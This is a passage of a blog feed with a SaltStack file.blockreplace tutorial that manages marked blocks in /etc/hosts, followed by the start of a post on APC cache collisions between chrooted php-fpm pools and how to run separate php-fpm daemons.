&lt;p&gt;The first one is a python based replacement for the old &lt;code&gt;file.sed&lt;/code&gt; function, it let you use some regex to find a content and replace it. But there's some drawbacks in its usage, at least on my point of view:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;MULTILINE regex are not supported, even if the documentation says it works, @see &lt;a href=&quot;https://github.com/saltstack/salt/issues/7999&quot;&gt;issue #7999&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;the file is altered at each salt run, errors may break it badly (empyt or partially empty), and access to the file whil salt is editing it should not happen (partial content), @see &lt;a href=&quot;https://github.com/saltstack/salt/issues/8051&quot;&gt;issue #8051&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;the MULTILINE regex issue was a big problem for us, because our first usage of unmanaged files edition was managing hosts files, with several lines added and &lt;em&gt;managed&lt;/em&gt;.
So we wanted to add a simple way to manage several lines in a file, without regex support (using replace for that), and we made it with blockreplace.&lt;/p&gt;

&lt;h2&gt;File.blockreplace&lt;/h2&gt;

&lt;p&gt;The main idea under &lt;strong&gt;blockreplace&lt;/strong&gt; is to &lt;strong&gt;manage blocks of edited contents&lt;/strong&gt; in files where everything outside of theses blocks is ignored by Salt-stack.&lt;/p&gt;

&lt;p&gt;With this module and/or state salt-stack can :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Add&lt;/strong&gt; the block of content (on top or on bottom) if it is not present&lt;/li&gt;
&lt;li&gt;manage &lt;strong&gt;several lines&lt;/strong&gt; inside the block&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;remove&lt;/strong&gt; content from a block&lt;/li&gt;
&lt;li&gt;identify &lt;strong&gt;several different blocks&lt;/strong&gt; in the same file&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Block identity targeting and delimitation is done by a comment. By default it use a &lt;code&gt;bash&lt;/code&gt; type of comment with &lt;code&gt;#&lt;/code&gt; characters. But you can alter it, if your target is an html file you could use &lt;code&gt;&amp;lt;!-- --&amp;gt;&lt;/code&gt; comments, if it's a code file you could use &lt;code&gt;/* */&lt;/code&gt; comments, etc.&lt;/p&gt;

&lt;p&gt;If you need several blocks in the same file you will need a way to identify theses different blocks, so inside theses comments there should be a unique block identifier. The whole marker line is searched, so the whole marker is this unique identifier. But if you make several blocks from the same marker model you should maybe add inside a unique variation, this is why the &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;state documentation&lt;/a&gt; example shows usage of a jinja &lt;code&gt;myvar&lt;/code&gt; variable present in the state id and in the block marker (imagine theses states running in a jinja for loop, with &lt;code&gt;myvar&lt;/code&gt; taking severa values.&lt;/p&gt;

&lt;p&gt;The module documentation shows an example of a managed block content in a file (the result):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(...)
# START managed zone 42 -DO-NOT-EDIT-
First line of content
text 2
text 3
text 4
# END managed zone 42 --
(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the block is delimited by the 'markers', the starting marker is &lt;code&gt;# START managed zone 42 -DO-NOT-EDIT-&lt;/code&gt; and the ending one is &lt;code&gt;# END managed zone 42 --&lt;/code&gt;. And the job of the state writer (you) is to keep theses markers unique in the file so that salt could indentify each block without any mistakes. Use long markers, short ones could work, of course, but with long markers you will avoid more easily the bad situation in which a part of your block content may contain the same thing as you end marker.&lt;/p&gt;

&lt;h2&gt;Step by step: Blockreplace real example with hosts&lt;/h2&gt;

&lt;p&gt;So now, to get a little deeper, we'll have a look at a real complete example. All theses examples are available in a github repository &lt;a href=&quot;https://github.com/regilero/regilero-blog-examples/tree/master/blockreplace-step-by-step&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Note that you can find other examples of usage &lt;a href=&quot;https://github.com/saltstack/salt/blob/develop/tests/unit/modules/file_test.py&quot;&gt;in the module unit test cases&lt;/a&gt;, search for &lt;code&gt;FileBlockReplaceTestCase&lt;/code&gt; class. And feel free to add your test cases (and issues) if you find something wrong.&lt;/p&gt;

&lt;p&gt;Back on our step by step, let's say I want to add some entries in a hosts file. In this example we'll say that the salt minion is building some services and knows several aliases for theses services (db.local.net, http.local.net, etc) that should be added on the hosts file, all targeting the 127.0.0.1 IP.&lt;/p&gt;

&lt;p&gt;The first step is to start with a very simple state, we will use it to see if at least salt can create the block in &lt;code&gt;/etc/hosts&lt;/code&gt;. This state is written in a &lt;code&gt;hostsedit1.sls&lt;/code&gt; file which should be on your salt states root directory (if it's not directly on the root, add &lt;code&gt;path.to.this.state.directory&lt;/code&gt; in the salt-call calls). Here is this state:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test-etc-hosts-blockreplace-services:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: &quot;# BLOCK TOP : salt managed zone : local services : please do not edit&quot;
    - marker_end: &quot;# BLOCK BOTTOM : end of salt managed zone --&quot;
    - content: '# here be dragons'
    - show_changes: True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here you can see I used a full name for the &lt;strong&gt;state id&lt;/strong&gt; (1st line), and not just the file path, as using full descriptive and unique ids is a very good habit. And using the name shortcut as a state id is maybe more readable in examples but it can lead to states overwrites, bad things. So I won't do that.&lt;/p&gt;

&lt;p&gt;The content is a comment, it's a test. I did &lt;strong&gt;not&lt;/strong&gt; alter manually the &lt;code&gt;/etc/hosts&lt;/code&gt; file to add my markers inside.&lt;/p&gt;

&lt;p&gt;Let's run the test (and not a highstate, only this simple sls), run it with a user having write access on the targeted hosts file, like the root user:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$: salt-call state.sls hostsedit1    
local:
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
    Result:    False
    Comment:   An exception occurred in this state: Traceback (most recent call last):
  File &quot;/path/to/salt/state.py&quot;, line 1325, in call
    *cdata['args'], **cdata['kwargs'])
  File &quot;path/to/salt/states/file.py&quot;, line 1882, in blockreplace
    show_changes=show_changes)
  File &quot;path/to/salt/modules/file.py&quot;, line 1105, in blockreplace
    raise CommandExecutionError(&quot;Cannot edit marked block. Markers were not found in file.&quot;)
CommandExecutionError: Cannot edit marked block. Markers were not found in file.
    Changes:   

Summary
------------
Succeeded: 0
Failed:    1
------------
Total:     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And if fails. Because the block is not found in the file. We need to tell salt that in this case the block should be added on top (&lt;code&gt;append_if_not_found&lt;/code&gt;) or on the bottom of the file (&lt;code&gt;prepend_if_not_found&lt;/code&gt;). You're maybe wondering why the state fails badly instead of creating the block by default. The reason is that you may have edited the marker (to add some variables) or you may have edited the file and remove an important thing (like the bottom marker), and you would not want the state to overwrite a part of your file or to duplicate the block. I prefer having exception when something bad happens, and no changes on the targeted file.
We need to add the append instruction, this is done in hostsedit2 (on this step by step I use different states, but you could edit the same state file)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test-etc-hosts-blockreplace-services:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: &quot;# BLOCK TOP : salt managed zone : local services : please do not edit&quot;
    - marker_end: &quot;# BLOCK BOTTOM : end of salt managed zone --&quot;
    - content: '# here be dragons'
    - show_changes: True
    - append_if_not_found: True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$: salt-call state.sls hostsedit2
 local:
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
        Result:    True
        Comment:   Changes were made
        Changes:   Invalid Changes data: --- 
+++ 
@@ -45,3 +45,6 @@
 192.168.1.52.3 toto3.foo.com
 192.168.1.52.4 toto4.foo.com
 192.168.1.52.5 toto5.foo.com
+# BLOCK TOP : salt managed zone : local services : please do not edit
+# here be dragons
+# BLOCK BOTTOM : end of salt managed zone --


Summary
------------
Succeeded: 1
Failed:    0
------------
Total:     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;Invalid Changes data&lt;/code&gt; is a known bug that should get fixed soon, is a false positive (changes should be a list of changes and not just the string I think, something like that), the changes are in fact OK. You can chek the hosts file, the block of text was added at the end of the file.&lt;/p&gt;

&lt;p&gt;And if you launch the state a second time you will see that no changes were detected, so the file is untouched.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;local:
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
        Result:    True
        Comment:   No changes were made
        Changes:   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that using an empty content argument would empty your block in /etc/hosts, while leaving in place the block markers comments.&lt;/p&gt;

&lt;p&gt;So now we'll add some more realistic content in the hosts file, some IP and DNS data. We'll do that in a &lt;code&gt;hostedit3.sls&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test-etc-hosts-blockreplace-services:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: &quot;# BLOCK TOP : salt managed zone : local services : please do not edit&quot;
    - marker_end: &quot;# BLOCK BOTTOM : end of salt managed zone --&quot; 
    - content: |
        127.0.0.1 db.local.net
        127.0.0.1 http.local.net
        127.0.0.1 foo bar foo.local.net bar.local.net
        127.0.0.1 foobar # with a comment
    - show_changes: True
    - append_if_not_found: True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Look at the &lt;code&gt;|&lt;/code&gt; this is used for multiline input in yaml, with newlines preservation.
Spaces, as always in yaml, are very important, If I show the first spaces with &lt;code&gt;x&lt;/code&gt; you can see that you need 4 more spaces after this pipe:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test-etc-hosts-blockreplace-services:
xxfile.blockreplace:
xxxx- name: /etc/hosts
xxxx- marker_start: &quot;# BLOCK TOP : salt managed zone : local services : please do not edit&quot;
xxxx- marker_end: &quot;# BLOCK BOTTOM : end of salt managed zone --&quot; 
xxxx- content: |
xxxxxxxx127.0.0.1 db.local.net
xxxxxxxx127.0.0.1 http.local.net
xxxxxxxx127.0.0.1 foo bar foo.local.net bar.local.net
xxxxxxxx127.0.0.1 foobar # with a comment
xxxx- show_changes: True
xxxx- append_if_not_found: True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And run it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$: salt-call state.sls hostsedit3
 local:
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
        Result:    True
        Comment:   Changes were made
        Changes:   Invalid Changes data: --- 
+++ 
@@ -46,5 +46,9 @@

 #-- end salt managed zoneend --
 # BLOCK TOP : salt managed zone : local services : please do not edit
-# here be dragons
+127.0.0.1 db.local.net
+127.0.0.1 http.local.net
+127.0.0.1 foo bar foo.local.net bar.local.net
+127.0.0.1 foobar # with a comment
+
 # BLOCK BOTTOM : end of salt managed zone --
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we will end this first example by managing two different blocks in the same file.&lt;/p&gt;

&lt;p&gt;Let's say we will now manage two different blocks on the file, one with local services, and one with external services, this is &lt;code&gt;hostedit4.sls&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test-etc-hosts-blockreplace-services-local:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: &quot;# BLOCK TOP : salt managed zone : local services : please do not edit&quot;
    - marker_end: &quot;# BLOCK BOTTOM : local : end of salt managed zone --&quot; 
    - content: |
        127.0.0.1 db.local.net
        127.0.0.1 http.local.net
        127.0.0.1 foo bar foo.local.net bar.local.net
        127.0.0.1 foobar # with a comment
    - show_changes: True
    - append_if_not_found: True

test-etc-hosts-blockreplace-services-central:
  file.blockreplace:
    - name: /etc/hosts
    - marker_start: &quot;# BLOCK TOP : salt managed zone : central services : please do not edit&quot;
    - marker_end: &quot;# BLOCK BOTTOM : central : end of salt managed zone --&quot; 
    - content: |
        8.8.8.8 ns1.dns.net
        8.8.4.4 ns2.dns.net
    - show_changes: True
    - append_if_not_found: True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The states ids are altered with &lt;code&gt;-local&lt;/code&gt; and &lt;code&gt;-central&lt;/code&gt; and the second state uses a different marker message. If I had used the same marker messages the second would have overwritten the first one. You may also see that I have added a  &lt;code&gt;central&lt;/code&gt; and a  &lt;code&gt;local&lt;/code&gt; keyword on the &lt;code&gt;marker_end&lt;/code&gt; sections. This way end markers are also uniques, the states could work with non unique end marker, the block end is detected on the first match of the end marker. But with unique end markers you will detect more easily broken blocks.&lt;/p&gt;

&lt;p&gt;And if I do not alter the &lt;code&gt;/etc/hosts&lt;/code&gt; file before running theses states I should see an example of broken block, because I altered the end marker for the first block, and salt cannot find this end marker on the current file, let's test it (let's be mad):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$: salt-call state.sls hostsedit4
local:
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
        Result:    False
        Comment:   An exception occurred in this state: Traceback (most recent call last):
  File &quot;/path/to/salt/state.py&quot;, line 1325, in call
    *cdata['args'], **cdata['kwargs'])
  File &quot;/path/to/salt/states/file.py&quot;, line 1882, in blockreplace
    show_changes=show_changes)
  File &quot;/path/to/salt/modules/file.py&quot;, line 1095, in blockreplace
    raise CommandExecutionError(&quot;Unterminated marked block. End of file reached before marker_end.&quot;)
CommandExecutionError: Unterminated marked block. End of file reached before marker_end.

 Changes:   
----------
    State: - file
    Name:      /etc/hosts
    Function:  blockreplace
        Result:    True
        Comment:   Changes were made
        Changes:   Invalid Changes data: --- 
+++ 
@@ -52,3 +52,6 @@
 127.0.0.1 foobar # with a comment

 # BLOCK BOTTOM : end of salt managed zone --
    +# BLOCK TOP : salt managed zone : central services : please do not edit
+8.8.8.8 ns1.dns.net
8.8.4.4 ns2.dns.net

+# BLOCK BOTTOM : central : end of salt managed zone --


Summary
------------
Succeeded: 1
Failed:    1
------------
Total:     2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfect, the second block was added and salt detected that the first state's block was now invalid &lt;code&gt;Unterminated marked block. End of file reached before marker_end&lt;/code&gt;. The block was not removed from the hosts file, simply salt is now unable to manage it.&lt;/p&gt;

&lt;p&gt;The fix here is either:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;to edit the /etc/hosts and replace the marker end comment of the first block from &lt;code&gt;# BLOCK BOTTOM : end of salt managed zone --&lt;/code&gt; to &lt;code&gt;# BLOCK BOTTOM : local : end of salt managed zone --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to do the contrary in the state, let the first block end on the &lt;code&gt;# BLOCK BOTTOM : end of salt managed zone --&lt;/code&gt; marker.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;You can test it, You'll get two working salt states, both editing the same hosts file and managing two different sections of the file.&lt;/p&gt;

&lt;h2&gt;Next?&lt;/h2&gt;

&lt;p&gt;A next post will cover &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; examples with managed files and also with blockreplace. I hope you feel now how powerful could be the combination of harvested data accumulated other several states with multiple edited text blocks.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/p&gt;
</description>
				<published>2014-01-20 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/</link>
			</item>
		
			<item>
				<title>Warning Chrooted php-fpm and Apc with multiple pools</title>
				<description>&lt;p&gt;PHP-fpm used as a fastgi backend for nginx or Apache is a very nice tool.
And the ability to chroot the php-fpm pool use a nice way to enforce projects separations.
I once wrote a detailled exemple for Apache (but I really prefer nginx),
with details on &lt;code&gt;open_basedir&lt;/code&gt; and temporary files
separation for each PHP project.
You should really use your PHP projets in such way to avoid having the least secure project
on your host used to attack other projects.&lt;/p&gt;

&lt;p&gt;But recently I discovered that using several projects on the same host, all using &lt;strong&gt;APC&lt;/strong&gt; opcode and &lt;strong&gt;php-fpm chroot&lt;/strong&gt; I ended up
with sources files from one project used on the others.. source code &lt;strong&gt;mix&lt;/strong&gt; .. and then really bad things happened...&lt;/p&gt;

&lt;h2&gt;WTF: Why are the conf files mixed between projects?&lt;/h2&gt;

&lt;p&gt;At first we were working with one php-fpm per host. On configurations where you have several hosts for the same project this
happens more than sharing one host for several projects.&lt;/p&gt;

&lt;p&gt;Then one day on some of theses hosts we deployed a clone of the project. On a different directory, with a second php-fpm pool,
where the only difference between the 2 projects were the &lt;code&gt;prefix&lt;/code&gt; in the php-fpm pool and the project's application settings
(where at least the base url name and database backend were different).&lt;/p&gt;

&lt;p&gt;This should be OK, and without APC it was OK. But as soon as APC were used some pages were randomly broken, using domain of
the first project for css files of the second project, or showing pages of second project in the fist one, a big random mess.
In our case the random thing was done by the fact several hosts were load balanced between several hosts and did not used the
same buggy files on each hosts.&lt;/p&gt;

&lt;p&gt;The problem is easy (well, it took me long minutes to find it the fist time),
APC is storing a compiled version of each file in his opcode cache, and
&lt;strong&gt;the cache key of this file is  the file name (full path)&lt;/strong&gt;.
If two chrooted projects &lt;strong&gt;share the same file names, only one version of this file is stored in APC!&lt;/strong&gt;
Without the chroot this never happens on a regular filesystem. But, by definition, using
a chroot your projects are using a shorter relative path to files, seing it as the real full path.&lt;/p&gt;

&lt;p&gt;So chances are that the configuration files on two projects where one is the production version and one the
test version will both be seen as (this is a Drupal setting for example):&lt;/p&gt;

&lt;pre&gt;
  /www/sites/default/settings.php
&lt;/pre&gt;


&lt;p&gt;Whereas the real filesystem paths are:&lt;/p&gt;

&lt;pre&gt;
  /var/www/app/production/www/sites/default/settings.php
  /var/www/app/test/www/sites/default/settings.php
&lt;/pre&gt;


&lt;p&gt;As of course the chroots are &lt;code&gt;var/www/app/production&lt;/code&gt; and &lt;code&gt;/var/www/app/test&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Quite easy te see on projects where key files like configuration files gets the same name.
But it could also happen with several projects having a lot of differences in file naming,
and where just one or two file names would conflict. It would make the bug harder to detect.&lt;/p&gt;

&lt;h2&gt;Solutions? one process per pool?&lt;/h2&gt;

&lt;p&gt;There is of course one solution for this problem which is either:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;to remove APC&lt;/li&gt;
&lt;li&gt;or only use one php-fpm pool per host&lt;/li&gt;
&lt;li&gt;or only use one php-fpm pool per php-fpm process, and run &lt;strong&gt;several php-fpm daemons&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;So when you want to have 2, 3 or more projects on one host, all using APC and a chrooted php-fpm pools you will duplicate the
php-fpm daemon for each project to ensure each pool is really independent of the other pools, and that a new APC, with a new shared
memory segment will be used on this new PHP daemon. You cannot use the default classical way with one daemon and several pools on this daemon.&lt;/p&gt;

&lt;p&gt;You can find examples of this. &lt;strong&gt;But&lt;/strong&gt; the process is not a simple a simply creating a new daemon with a new
configuration file. On debian, for example, the start/stop init script will likely kill all the php-fpm process running
on the Hosts, ignoring the fact they are from several different daemons.&lt;/p&gt;

&lt;p&gt;So let's study it in details&lt;/p&gt;

&lt;h3&gt;Duplicate the php-fpm daemon process&lt;/h3&gt;

&lt;p&gt;The first thing to do is to create a new php-fpm configuration for the new php-fpm process. The first process/daemon will be &lt;strong&gt;php-fpm&lt;/strong&gt;,
we will call the second &lt;strong&gt;php-fpm-test&lt;/strong&gt;. So this new conf file will also have the &lt;strong&gt;-test&lt;/strong&gt; extension.&lt;/p&gt;

&lt;p&gt;Usually, at least on debian, the main configuration file is loading all pools from the pool diectory with
this instruction:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;include=/etc/php5/fpm/pool.d/*.conf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We alter the configuration file to only include one pool. Then we make the copy and alter this name in the second file,
we also alter the pid setting reference.
After that a diff should give something like that:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff -bBNaur /etc/php5/fpm/php-fpm.conf /etc/php5/fpm/php-fpm-test.conf
--- /etc/php5/fpm/php-fpm.conf  2013-04-10 16:48:23.000000000 +0200
+++ /etc/php5/fpm/php-fpm-test.conf  2013-04-10 18:34:12.000000000 +0200
@@ -22,7 +22,7 @@
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Pid file
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Note: the default prefix is /var
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Default Value: none
-pid &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /var/run/php5-fpm.pid
+pid &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /var/run/php5-fpm-test.pid
 
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Error log file
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; If it&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;s &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to &lt;span class=&quot;s2&quot;&gt;&amp;quot;syslog&amp;quot;&lt;/span&gt;, log is sent to syslogd instead of being written
@@ -118,5 +118,5 @@
 
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; To configure the pools it is recommended to have one .conf file per
 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pool in the following directory:
-include&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/php5/fpm/pool.d/my-pool.conf
+include&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/php5/fpm/pool.d/my-pool-test.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we need an init script starting a new php-fpm daemon using this &lt;code&gt;php-fpm-test.conf&lt;/code&gt; file.
Copy the main startup script on a new one with test extension and alter it so that at least you obtain this diff:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff -bBNaur /etc/init.d/php5-fpm /etc/init.d/php5-fpm-test
--- /etc/init.d/php5-fpm  2012-07-23 13:59:30.000000000 +0200
+++ /etc/init.d/php5-fpm-test  2013-04-10 18:56:22.000000000 +0200
@@ -1,24 +1,24 @@
 &lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;### BEGIN INIT INFO&lt;/span&gt;
-# Provides:          php-fpm php5-fpm
+# Provides:          php-fpm-test php5-fpm-test
 &lt;span class=&quot;c&quot;&gt;# Required-Start:    $remote_fs $network&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# Required-Stop:     $remote_fs $network&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# Default-Start:     2 3 4 5&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# Default-Stop:      0 1 6 &lt;/span&gt;
-# Short-Description: starts php5-fpm
-# Description:       Starts PHP5 FastCGI Process Manager Daemon
+# Short-Description: starts php5-fpm-test
+# Description:       Starts PHP5 FastCGI Process Manager Daemon &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;### END INIT INFO&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# Author: Ondrej Sury &amp;lt;ondrej@debian.org&amp;gt;&lt;/span&gt;
 
 &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin:/usr/sbin:/bin:/usr/bin
 &lt;span class=&quot;nv&quot;&gt;DESC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;PHP5 FastCGI Process Manager&amp;quot;&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php5-fpm
 &lt;span class=&quot;nv&quot;&gt;DAEMON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/&lt;span class=&quot;nv&quot;&gt;$NAME&lt;/span&gt;
-DAEMON_ARGS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;--fpm-config /etc/php5/fpm/php-fpm.conf&amp;quot;&lt;/span&gt;
-PIDFILE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/run/php5-fpm.pid
+DAEMON_ARGS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;--fpm-config /etc/php5/fpm/php-fpm-test.conf&amp;quot;&lt;/span&gt;
+PIDFILE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/run/php5-fpm-test.pid
 &lt;span class=&quot;nv&quot;&gt;TIMEOUT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30
-SCRIPTNAME&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/init.d/&lt;span class=&quot;nv&quot;&gt;$NAME&lt;/span&gt;
+SCRIPTNAME&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/init.d/&lt;span class=&quot;nv&quot;&gt;$NAME&lt;/span&gt;-test
 
 &lt;span class=&quot;c&quot;&gt;# Exit if the package is not installed&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -x &lt;span class=&quot;s2&quot;&gt;&amp;quot;$DAEMON&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Do not forget to add this script on start/stop levels if you want it after reboot.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;update-rc.d default php5-fpm-test defaults&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Start this new php-fpm, it should be ok.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/init.d/php5-fpm-test start&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Test it with this  &lt;code&gt;ps&lt;/code&gt; command, you sholuld see the two daemons and the children, one pool per daemon
(number of children depends on your pool's settings):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ps auxf&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;grep php
 
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;30688&lt;/span&gt;  0.0  0.0   &lt;span class=&quot;m&quot;&gt;9616&lt;/span&gt;   &lt;span class=&quot;m&quot;&gt;904&lt;/span&gt; pts/0    S+   13:47   0:00              &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; grep php
 root     &lt;span class=&quot;m&quot;&gt;17906&lt;/span&gt;  0.0  0.1 &lt;span class=&quot;m&quot;&gt;667208&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;5236&lt;/span&gt; ?        Ss   May07   0:13 php-fpm: master process &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/etc/php5/fpm/php-fpm-test.conf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;      &lt;span class=&quot;m&quot;&gt;9753&lt;/span&gt;  0.0  3.0 &lt;span class=&quot;m&quot;&gt;733316&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;122300&lt;/span&gt; ?       S    04:13   0:06  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool-test
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;      &lt;span class=&quot;m&quot;&gt;9754&lt;/span&gt;  0.0  1.9 &lt;span class=&quot;m&quot;&gt;691336&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;81188&lt;/span&gt; ?        S    04:13   0:04  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool-test
 &lt;span class=&quot;m&quot;&gt;1005&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;17920&lt;/span&gt;  0.0  3.0 &lt;span class=&quot;m&quot;&gt;733316&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;123152&lt;/span&gt; ?       S    05:41   0:05  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; php-fpm: pool my-pool-test
 root     &lt;span class=&quot;m&quot;&gt;19130&lt;/span&gt;  0.0  0.1 &lt;span class=&quot;m&quot;&gt;667908&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;5940&lt;/span&gt; ?        Ss   May07   0:14 php-fpm: master process &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/etc/php5/fpm/php-fpm.conf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
